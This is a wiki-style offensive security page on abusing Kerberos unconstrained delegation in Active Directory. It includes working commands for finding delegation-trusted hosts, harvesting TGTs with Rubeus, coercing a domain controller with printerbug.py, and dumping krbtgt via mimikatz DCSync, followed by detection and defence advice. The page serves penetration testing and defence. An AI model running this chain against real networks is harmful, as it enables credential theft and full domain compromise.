---
title: Unconstrained delegation
slug: unconstrained-delegation
---

> **TL;DR:** A computer flagged `TRUSTED_FOR_DELEGATION` receives an embedded copy of every incoming user's TGT inside the service ticket. Compromise the box, harvest TGTs from LSASS, and you authenticate as those users anywhere. Combine with a forced-auth primitive aimed at a DC for a one-shot path to Domain Admin.

## What it is
Unconstrained delegation is the original (and most dangerous) Kerberos delegation flavour. When a user authenticates to a service whose account has `TrustedForDelegation = true`, the KDC includes the user's TGT inside the service ticket (the `additional-tickets` field). The service can then extract that TGT and use it on the user's behalf against *any* service. Microsoft kept it for backward compatibility with apps that need to "double-hop" without specifying targets.

## Preconditions / where it applies
- Code execution as SYSTEM (or the service account) on a host with `userAccountControl & 0x80000` set on its computer object
- Network reach to the DC for Kerberos
- For the auto-pwn chain: a coercion vector ([[ms-rpc-abuse]]) on a DC

## Technique
1. Find boxes trusted for delegation (excluding DCs, which are trusted by definition but heavily monitored):

```bash
GetUserSPNs.py -unconstrained corp.local/alice:Pass -dc-ip 10.0.0.10
# or
Get-ADComputer -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
```

2. Pop SYSTEM on `WEB01$`. Monitor LSASS for cached TGTs:

```powershell
Rubeus.exe monitor /interval:5 /nowrap
```

3. Trigger a high-privilege account to authenticate inbound. The classic vector is PrinterBug — force a DC's machine account to authenticate to `web01.corp.local`:

```bash
printerbug.py corp.local/alice:Pass@dc01.corp.local web01.corp.local
```

`DC01$` connects to `WEB01`; its TGT lands in WEB01's LSASS cache because of the delegation flag. Rubeus prints the base64 TGT.

4. Inject and use:

```powershell
Rubeus.exe ptt /ticket:doIFt...
# Now act as DC01$ — DCSync the domain
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

DCs themselves are unconstrained-delegation-trusted; if you can run code as SYSTEM on a DC the technique is moot (you already have DCSync). The real prize is a non-DC server whose admins are also DC machine-account-equivalent via this trick.

## Detection and defence
- Audit `userAccountControl` change events (5136) flipping the `TRUSTED_FOR_DELEGATION` bit — should be zero in modern environments
- Replace unconstrained with constrained or RBCD wherever feasible; add Tier-0 / sensitive users to Protected Users and mark them `Account is sensitive and cannot be delegated`
- Hunt 4769 TGS-REQ where the service is a non-DC marked unconstrained, and 4624 logons from machine accounts to those hosts
- Disable Print Spooler on DCs; patch all coercion vectors (PetitPotam, DFSCoerce, ShadowCoerce)

## References
- [HackTricks — unconstrained delegation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html) — practical walkthrough
- [Hacker Recipes — Unconstrained delegation](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/unconstrained) — protocol detail
- [Harmj0y — S4U2Pwnage](https://blog.harmj0y.net/activedirectory/s4u2pwnage/) — delegation primer
- See also: [[constrained-delegation]], [[resource-based-constrained-delegation]], [[ms-rpc-abuse]], [[kerberos]]
